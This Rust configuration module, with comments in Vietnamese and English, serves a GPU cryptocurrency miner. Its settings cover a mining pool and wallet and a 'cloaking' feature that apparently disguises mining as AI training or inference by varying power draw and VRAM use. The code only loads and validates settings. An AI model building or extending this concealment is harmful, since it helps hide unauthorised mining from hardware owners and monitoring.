/*!
 * Configuration Management Module
 * 
 * Module quản lý cấu hình hệ thống - load từ TOML, validate và cung cấp typed config
 */

use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::Path;

/// Main application configuration
/// Cấu hình chính của ứng dụng
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct AppConfig {
    /// Event bus configuration (cấu hình bus sự kiện)
    #[serde(default = "default_event_bus_capacity")]
    pub event_bus_capacity: usize,

    /// GPU executor configuration (cấu hình thực thi GPU)
    pub gpu_executor: GPUExecutorConfig,

    /// Cloaking system configuration (cấu hình hệ thống ngụy trang)
    pub cloaking: CloakingConfig,

    /// Resource manager configuration (cấu hình quản lý tài nguyên)
    pub resource_manager: ResourceManagerConfig,

    /// Security configuration (cấu hình bảo mật)
    pub security: SecurityConfig,

    /// Telemetry configuration (cấu hình giám sát)
    pub telemetry: TelemetryConfig,
}

/// GPU Executor Configuration
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct GPUExecutorConfig {
    /// CUDA device ID to use (ID thiết bị CUDA - card GPU)
    #[serde(default)]
    pub device_id: u32,

    /// Power limit in watts (giới hạn công suất - đơn vị watt)
    pub power_limit_watts: Option<u32>,

    /// Target GPU utilization (0.0-1.0) (mức sử dụng GPU mục tiêu)
    #[serde(default = "default_target_utilization")]
    pub target_utilization: f32,

    /// Mining pool configuration (cấu hình pool khai thác)
    pub pool: PoolConfig,

    /// Enable NVML control (bật điều khiển NVML - quản lý GPU)
    #[serde(default = "default_true")]
    pub nvml_enabled: bool,
}

/// Mining Pool Configuration
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct PoolConfig {
    /// Pool URL (e.g., stratum+tcp://pool.example.com:3333)
    pub url: String,

    /// Wallet address (địa chỉ ví)
    pub wallet: String,

    /// Worker name (optional) (tên worker - tuỳ chọn)
    pub worker: Option<String>,

    /// Pool password (optional) (mật khẩu pool - tuỳ chọn)
    pub password: Option<String>,
}

/// Cloaking System Configuration
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct CloakingConfig {
    /// Enable cloaking (bật ngụy trang)
    #[serde(default = "default_true")]
    pub enabled: bool,

    /// Cloaking strategy: "adaptive", "training", "inference" (chiến lược ngụy trang)
    #[serde(default = "default_cloaking_strategy")]
    pub strategy: String,

    /// VRAM allocation percentage (0.0-1.0) (phần trăm VRAM phân bổ)
    #[serde(default = "default_vram_allocation")]
    pub vram_allocation: f32,

    /// Power variation percentage (0.0-1.0) (phần trăm biến thiên công suất)
    #[serde(default = "default_power_variation")]
    pub power_variation: f32,

    /// Cycle duration in seconds (thời gian chu kỳ - giây)
    #[serde(default = "default_cycle_duration")]
    pub cycle_duration: u64,
}

/// Resource Manager Configuration
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct ResourceManagerConfig {
    /// Enable QoS enforcement (bật thực thi QoS - đảm bảo chất lượng dịch vụ)
    #[serde(default = "default_true")]
    pub qos_enabled: bool,

    /// CPU usage limit (0.0-1.0) (giới hạn sử dụng CPU)
    #[serde(default = "default_cpu_limit")]
    pub cpu_limit: f32,

    /// GPU usage limit (0.0-1.0) (giới hạn sử dụng GPU)
    #[serde(default = "default_gpu_limit")]
    pub gpu_limit: f32,

    /// Network bandwidth limit in Mbps (giới hạn băng thông mạng - Mbps)
    pub network_limit_mbps: Option<u32>,

    /// Enable backpressure (bật phản áp - kiểm soát tải)
    #[serde(default = "default_true")]
    pub backpressure_enabled: bool,
}

/// Security Configuration
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct SecurityConfig {
    /// Enable mTLS (bật mTLS - xác thực hai chiều)
    #[serde(default)]
    pub mtls_enabled: bool,

    /// Certificate path (đường dẫn chứng chỉ)
    pub cert_path: Option<String>,

    /// Private key path (đường dẫn khóa riêng)
    pub key_path: Option<String>,

    /// Enable plugin signature verification (bật xác minh chữ ký plugin)
    #[serde(default = "default_true")]
    pub verify_plugins: bool,

    /// Secrets vault path (đường dẫn kho bí mật)
    #[serde(default = "default_secrets_path")]
    pub secrets_path: String,
}

/// Telemetry Configuration
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct TelemetryConfig {
    /// Enable Prometheus metrics export (bật xuất metrics Prometheus)
    #[serde(default = "default_true")]
    pub prometheus_enabled: bool,

    /// Prometheus listen address (địa chỉ lắng nghe Prometheus)
    #[serde(default = "default_prometheus_addr")]
    pub prometheus_addr: String,

    /// Metrics collection interval in seconds (khoảng thời gian thu thập metrics - giây)
    #[serde(default = "default_metrics_interval")]
    pub metrics_interval_secs: u64,

    /// Log directory (thư mục log)
    #[serde(default = "default_log_dir")]
    pub log_dir: String,
}

// Default value functions (hàm giá trị mặc định)
fn default_event_bus_capacity() -> usize { 10000 }
fn default_target_utilization() -> f32 { 0.85 }
fn default_true() -> bool { true }
fn default_cloaking_strategy() -> String { "adaptive".to_string() }
fn default_vram_allocation() -> f32 { 0.50 }
fn default_power_variation() -> f32 { 0.12 }
fn default_cycle_duration() -> u64 { 90 }
fn default_cpu_limit() -> f32 { 0.80 }
fn default_gpu_limit() -> f32 { 0.95 }
fn default_secrets_path() -> String { "/var/lib/app-gpu/secrets".to_string() }
fn default_prometheus_addr() -> String { "0.0.0.0:9090".to_string() }
fn default_metrics_interval() -> u64 { 30 }
fn default_log_dir() -> String { "/var/log/app-gpu".to_string() }

impl AppConfig {
    /// Load configuration from file
    /// Tải cấu hình từ file
    pub fn load<P: AsRef<Path>>(path: P) -> Result<Self> {
        let content = fs::read_to_string(path.as_ref())
            .with_context(|| format!("Failed to read config file: {}", path.as_ref().display()))?;

        let config: AppConfig = toml::from_str(&content)
            .with_context(|| "Failed to parse config file as TOML")?;

        config.validate()
            .context("Configuration validation failed")?;

        Ok(config)
    }

    /// Validate configuration
    /// Xác thực cấu hình - kiểm tra giá trị hợp lệ
    fn validate(&self) -> Result<()> {
        // Validate GPU executor
        if self.gpu_executor.target_utilization < 0.0 || self.gpu_executor.target_utilization > 1.0 {
            anyhow::bail!("gpu_executor.target_utilization must be between 0.0 and 1.0");
        }

        // Validate cloaking
        if self.cloaking.vram_allocation < 0.0 || self.cloaking.vram_allocation > 1.0 {
            anyhow::bail!("cloaking.vram_allocation must be between 0.0 and 1.0");
        }
        if self.cloaking.power_variation < 0.0 || self.cloaking.power_variation > 1.0 {
            anyhow::bail!("cloaking.power_variation must be between 0.0 and 1.0");
        }

        // Validate resource manager
        if self.resource_manager.cpu_limit < 0.0 || self.resource_manager.cpu_limit > 1.0 {
            anyhow::bail!("resource_manager.cpu_limit must be between 0.0 and 1.0");
        }
        if self.resource_manager.gpu_limit < 0.0 || self.resource_manager.gpu_limit > 1.0 {
            anyhow::bail!("resource_manager.gpu_limit must be between 0.0 and 1.0");
        }

        Ok(())
    }

    /// Create a default configuration (for testing)
    /// Tạo cấu hình mặc định - cho testing
    #[cfg(test)]
    pub fn default() -> Self {
        Self {
            event_bus_capacity: default_event_bus_capacity(),
            gpu_executor: GPUExecutorConfig {
                device_id: 0,
                power_limit_watts: Some(250),
                target_utilization: default_target_utilization(),
                pool: PoolConfig {
                    url: "stratum+tcp://pool.example.com:3333".to_string(),
                    wallet: "0x1234567890abcdef".to_string(),
                    worker: Some("worker1".to_string()),
                    password: None,
                },
                nvml_enabled: true,
            },
            cloaking: CloakingConfig {
                enabled: true,
                strategy: default_cloaking_strategy(),
                vram_allocation: default_vram_allocation(),
                power_variation: default_power_variation(),
                cycle_duration: default_cycle_duration(),
            },
            resource_manager: ResourceManagerConfig {
                qos_enabled: true,
                cpu_limit: default_cpu_limit(),
                gpu_limit: default_gpu_limit(),
                network_limit_mbps: Some(100),
                backpressure_enabled: true,
            },
            security: SecurityConfig {
                mtls_enabled: false,
                cert_path: None,
                key_path: None,
                verify_plugins: true,
                secrets_path: default_secrets_path(),
            },
            telemetry: TelemetryConfig {
                prometheus_enabled: true,
                prometheus_addr: default_prometheus_addr(),
                metrics_interval_secs: default_metrics_interval(),
                log_dir: default_log_dir(),
            },
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use tempfile::NamedTempFile;

    #[test]
    fn test_load_valid_config() {
        let mut file = NamedTempFile::new().unwrap();
        writeln!(
            file,
            r#"
            event_bus_capacity = 5000

            [gpu_executor]
            device_id = 0
            power_limit_watts = 250
            target_utilization = 0.85
            nvml_enabled = true

            [gpu_executor.pool]
            url = "stratum+tcp://pool.example.com:3333"
            wallet = "0xabcdef"
            worker = "worker1"

            [cloaking]
            enabled = true
            strategy = "adaptive"
            vram_allocation = 0.5
            power_variation = 0.12
            cycle_duration = 90

            [resource_manager]
            qos_enabled = true
            cpu_limit = 0.8
            gpu_limit = 0.95
            backpressure_enabled = true

            [security]
            mtls_enabled = false
            verify_plugins = true
            secrets_path = "/var/lib/app-gpu/secrets"

            [telemetry]
            prometheus_enabled = true
            prometheus_addr = "0.0.0.0:9090"
            metrics_interval_secs = 30
            log_dir = "/var/log/app-gpu"
            "#
        ).unwrap();

        let config = AppConfig::load(file.path()).unwrap();
        assert_eq!(config.event_bus_capacity, 5000);
        assert_eq!(config.gpu_executor.device_id, 0);
        assert_eq!(config.cloaking.strategy, "adaptive");
    }

    #[test]
    fn test_validate_invalid_utilization() {
        let mut config = AppConfig::default();
        config.gpu_executor.target_utilization = 1.5; // Invalid
        assert!(config.validate().is_err());
    }
}
